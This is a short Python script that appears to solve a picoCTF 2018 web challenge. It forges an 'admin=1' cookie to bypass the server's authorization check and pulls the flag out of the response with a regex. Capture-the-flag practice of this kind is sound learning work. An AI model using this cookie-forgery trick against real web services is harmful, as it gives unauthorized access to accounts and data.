#!/usr/bin/env python

import re
import requests

url= 'http://2018shell3.picoctf.com:10573/flag'
r = requests.get(url, cookies ={'admin':'1'})
print re.findall('picoCTF{.*}', r.text)[0]

